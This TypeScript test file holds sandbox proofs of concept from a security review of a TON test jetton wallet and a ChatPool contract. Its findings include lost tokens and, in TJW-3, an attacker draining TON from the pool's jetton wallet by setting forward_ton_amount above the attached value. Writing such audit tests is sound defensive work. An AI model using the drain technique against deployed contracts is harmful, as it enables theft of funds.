// Security-review PoCs for TestJettonWallet (contracts/test_jetton.tact).
// Read-only w.r.t. contracts/wrappers/build: uses existing build artifacts.
// TJW-6 (ChatPool rejected by real wallets) was fixed in #6; its regression
// coverage lives in tests/RealJettonWallets.spec.ts.
import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Address, beginCell, Cell, toNano } from '@ton/core';
import { keyPairFromSeed, KeyPair } from '@ton/crypto';
import { TestJettonMinter, TestJettonWallet } from '../../wrappers/TestJetton';
import { ChatPool, storeAdminInitVoucher, storeDepositVoucher } from '../../wrappers/ChatPool';
import '@ton/test-utils';
import { globalIdOf, signatureCell, signVoucher, TAG } from '../helpers/vouchers';

const CHAT_ID = 1001234567890n;
const farFuture = () => BigInt(Math.floor(Date.now() / 1000) + 3600);

describe('TestJettonWallet PoC', () => {
    let blockchain: Blockchain;
    let deployer: SandboxContract<TreasuryContract>;
    let alice: SandboxContract<TreasuryContract>;
    let bob: SandboxContract<TreasuryContract>;
    let minter: SandboxContract<TestJettonMinter>;

    async function walletOf(owner: Address) {
        return blockchain.openContract(TestJettonWallet.fromAddress(await minter.getGetWalletAddress(owner)));
    }
    async function balOf(owner: Address): Promise<bigint> {
        const w = await walletOf(owner);
        const st = await blockchain.getContract(w.address);
        if (st.accountState?.type !== 'active') return 0n;
        return w.getWalletBalance();
    }

    beforeEach(async () => {
        blockchain = await Blockchain.create();
        deployer = await blockchain.treasury('deployer');
        alice = await blockchain.treasury('alice');
        bob = await blockchain.treasury('bob');
        minter = blockchain.openContract(
            await TestJettonMinter.fromInit(deployer.address, beginCell().storeUint(0, 8).endCell()),
        );
        await minter.send(deployer.getSender(), { value: toNano('0.05') }, { $$type: 'Deploy', queryId: 0n });
        await minter.send(
            deployer.getSender(),
            { value: toNano('0.2') },
            {
                $$type: 'Mint',
                amount: toNano('1000'),
                recipient: alice.address,
            },
        );
        expect(await balOf(alice.address)).toEqual(toNano('1000'));
    });

    // ---------------------------------------------------------------- TJW-1
    describe('TJW-1: tokens destroyed when the receiving wallet throws (no bounced handler)', () => {
        const cases: [string, Cell][] = [
            // TEP-74 text comment, Either-left (inline): 0 bit + op 0 + text
            ['inline text comment', beginCell().storeUint(0, 1).storeUint(0, 32).storeStringTail('hi').endCell()],
            // empty forward payload (no Either bit) with forward_ton_amount > 0
            ['empty payload', beginCell().endCell()],
            // ref-wrapped but the ref is too large to be inlined into the notification
            [
                'ref-wrapped 900-bit payload',
                beginCell().storeUint(1, 1).storeRef(beginCell().storeUint(0, 900).endCell()).endCell(),
            ],
        ];
        for (const [name, payload] of cases) {
            it(name, async () => {
                const aw = await walletOf(alice.address);
                const res = await aw.send(
                    alice.getSender(),
                    { value: toNano('0.3') },
                    {
                        $$type: 'JettonTransfer',
                        queryId: 7n,
                        amount: toNano('100'),
                        destination: bob.address,
                        responseDestination: alice.address,
                        customPayload: null,
                        forwardTonAmount: toNano('0.05'),
                        forwardPayload: payload,
                    },
                );
                const bw = await walletOf(bob.address);
                // receiving wallet aborts...
                expect(res.transactions).toHaveTransaction({ from: aw.address, to: bw.address, success: false });
                // ...the bounce comes back and is silently accepted (router returns on msg_bounced)
                expect(res.transactions).toHaveTransaction({ from: bw.address, to: aw.address, success: true });
                const a = await balOf(alice.address);
                const b = await balOf(bob.address);
                console.log(`[TJW-1 ${name}] alice=${a} bob=${b} minted=${await minter.getMintedTotal()}`);
                expect(a).toEqual(toNano('900')); // debited, never restored
                expect(b).toEqual(0n);
                expect(a + b).toBeLessThan(await minter.getMintedTotal()); // 100 tokens vanished
            });
        }
    });

    // ---------------------------------------------------------------- TJW-2
    it('TJW-2: no value check on JettonTransfer -> receiver underfunded -> tokens lost', async () => {
        const aw = await walletOf(alice.address);
        // forward_ton_amount larger than attached value; Bob's wallet is fresh (0 TON)
        const res = await aw.send(
            alice.getSender(),
            { value: toNano('0.05') },
            {
                $$type: 'JettonTransfer',
                queryId: 1n,
                amount: toNano('10'),
                destination: bob.address,
                responseDestination: alice.address,
                customPayload: null,
                forwardTonAmount: toNano('1'),
                forwardPayload: beginCell().storeUint(1, 1).storeRef(beginCell().endCell()).endCell(),
            },
        );
        const bw = await walletOf(bob.address);
        const tx = res.transactions.find((t) => t.inMessage?.info.dest?.toString() === bw.address.toString());
        const d: any = tx!.description;
        console.log(
            `[TJW-2] compute success=${d.computePhase?.success} action success=${d.actionPhase?.success} resultCode=${d.actionPhase?.resultCode} aborted=${d.aborted}`,
        );
        console.log(`[TJW-2] alice=${await balOf(alice.address)} bob=${await balOf(bob.address)}`);
        expect(await balOf(alice.address)).toEqual(toNano('990'));
        expect(await balOf(bob.address)).toEqual(0n);
    });

    // ---------------------------------------------------------------- shared ChatPool setup
    // A pool initialised as the master does it, with alice as its admin and
    // the test jetton registered (TEP-89): alice's deposits are credited.
    async function setupPool(): Promise<{ pool: SandboxContract<ChatPool>; backend: KeyPair }> {
        const master = await blockchain.treasury('distributor-master');
        const backend = keyPairFromSeed(Buffer.alloc(32, 7));
        const pool = blockchain.openContract(await ChatPool.fromInit(master.address, CHAT_ID));
        await pool.send(
            master.getSender(),
            { value: toNano('0.15') },
            {
                $$type: 'InitPool',
                backendPubKey: BigInt('0x' + backend.publicKey.toString('hex')),
                excessTo: master.address,
            },
        );
        const voucher = beginCell()
            .store(
                storeAdminInitVoucher({
                    $$type: 'AdminInitVoucher',
                    chatId: CHAT_ID,
                    master: master.address,
                    admin: alice.address,
                    expiry: farFuture(),
                }),
            )
            .endCell();
        await pool.send(
            alice.getSender(),
            { value: toNano('0.05') },
            {
                $$type: 'SetAdmin',
                voucherCell: voucher,
                signature: signatureCell(
                    signVoucher(voucher, backend, TAG.Admin, pool.address, globalIdOf(blockchain)),
                ),
            },
        );
        expect((await pool.getPoolAdmin())!.equals(alice.address)).toBe(true);
        await pool.send(
            alice.getSender(),
            { value: toNano('0.1') },
            { $$type: 'RegisterJetton', jettonMaster: minter.address },
        );
        expect(await pool.getJettonWallet(minter.address)).not.toBeNull();
        return { pool, backend };
    }

    function depositPayloadCell(backend: KeyPair, pool: Address, jettonMaster: Address): Cell {
        const voucher = beginCell()
            .store(
                storeDepositVoucher({ $$type: 'DepositVoucher', chatId: CHAT_ID, jettonMaster, expiry: farFuture() }),
            )
            .endCell();
        const sig = signVoucher(voucher, backend, TAG.Deposit, pool, globalIdOf(blockchain));
        return beginCell().storeRef(voucher).storeBuffer(sig).endCell();
    }

    // ---------------------------------------------------------------- TJW-3
    it('TJW-3: anyone drains TON held by the pool jetton wallet via forward_ton_amount > msg.value', async () => {
        const { pool, backend } = await setupPool();
        const poolWallet = await walletOf(pool.address);
        // honest deposit deploys the pool wallet
        const aw = await walletOf(alice.address);
        await aw.send(
            alice.getSender(),
            { value: toNano('0.25') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount: toNano('100'),
                destination: pool.address,
                responseDestination: alice.address,
                customPayload: null,
                forwardTonAmount: toNano('0.15'),
                forwardPayload: beginCell()
                    .storeUint(1, 1)
                    .storeRef(depositPayloadCell(backend, pool.address, minter.address))
                    .endCell(),
            },
        );
        expect(await pool.getBalanceOf(minter.address)).toEqual(toNano('100'));
        // TON that sits on the pool wallet (accumulated 0.02 TON/transfer reserves, accidental top-ups)
        await deployer.send({ to: poolWallet.address, value: toNano('2'), bounce: false });

        const attacker = await blockchain.treasury('attacker');
        await minter.send(
            deployer.getSender(),
            { value: toNano('0.2') },
            { $$type: 'Mint', amount: 1n, recipient: attacker.address },
        );
        const xw = await walletOf(attacker.address);

        const before = await attacker.getBalance();
        const wBefore = (await blockchain.getContract(poolWallet.address)).balance;
        const res = await xw.send(
            attacker.getSender(),
            { value: toNano('0.1') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount: 1n,
                destination: pool.address,
                responseDestination: attacker.address,
                customPayload: null,
                forwardTonAmount: toNano('1.9'), // >> attached 0.1 TON
                forwardPayload: beginCell()
                    .storeUint(1, 1)
                    .storeRef(beginCell().storeUint(0xdead, 16).endCell())
                    .endCell(),
            },
        );
        expect(res.transactions).toHaveTransaction({
            from: poolWallet.address,
            to: pool.address,
            value: toNano('1.9'),
        });
        const after = await attacker.getBalance();
        const wAfter = (await blockchain.getContract(poolWallet.address)).balance;
        console.log(
            `[TJW-3] attacker net TON = ${Number(after - before) / 1e9}, pool wallet TON ${Number(wBefore) / 1e9} -> ${Number(wAfter) / 1e9}`,
        );
        expect(after - before).toBeGreaterThan(toNano('1.5'));
        expect(await balOf(attacker.address)).toEqual(1n); // jetton refunded too: free drain
        expect(await pool.getBalanceOf(minter.address)).toEqual(toNano('100'));
    });

    // ---------------------------------------------------------------- TJW-7 / sanity
    it('sanity: forged internal transfer from a non-sibling is rejected', async () => {
        const bw = await walletOf(bob.address);
        const body = beginCell()
            .storeUint(0x178d4519, 32)
            .storeUint(0, 64)
            .storeCoins(toNano('1000000'))
            .storeAddress(bob.address)
            .storeUint(0, 2)
            .storeCoins(0)
            .endCell();
        // attacker claims to be Bob's own sibling, from his own address
        const res = await deployer.send({
            to: bw.address,
            value: toNano('0.1'),
            body,
            init: (await TestJettonWallet.fromInit(bob.address, minter.address)).init!,
        });
        expect(res.transactions).toHaveTransaction({ to: bw.address, success: false, exitCode: 14236 });
    });

    it('TJW-8: trailing data after the ref-wrapped payload is silently dropped', async () => {
        const echo = await blockchain.treasury('echo');
        const aw = await walletOf(alice.address);
        const payload = beginCell()
            .storeUint(1, 1)
            .storeRef(beginCell().storeUint(0xaa, 8).endCell())
            .storeUint(0xbeef, 16)
            .endCell();
        const res = await aw.send(
            alice.getSender(),
            { value: toNano('0.3') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount: 1n,
                destination: echo.address,
                responseDestination: null,
                customPayload: null,
                forwardTonAmount: toNano('0.01'),
                forwardPayload: payload,
            },
        );
        const note = res.transactions.find(
            (t) =>
                t.inMessage?.info.dest?.toString() === echo.address.toString() &&
                t.inMessage.body.beginParse().preloadUint(32) === 0x7362d09c,
        )!;
        const s = note.inMessage!.body.beginParse();
        s.skip(32 + 64);
        s.loadCoins();
        s.loadAddress();
        console.log(`[TJW-8] notification payload bits=${s.remainingBits} refs=${s.remainingRefs}`);
        expect(s.remainingBits).toEqual(8); // unwrapped ref content only; 0xbeef lost, Either bit gone
        // responseDestination=null: TEP-74 keeps the excess; this wallet sends it to the owner
        const w = await walletOf(echo.address);
        expect(res.transactions).toHaveTransaction({ from: w.address, to: echo.address, op: 0xd53276db });
    });
});
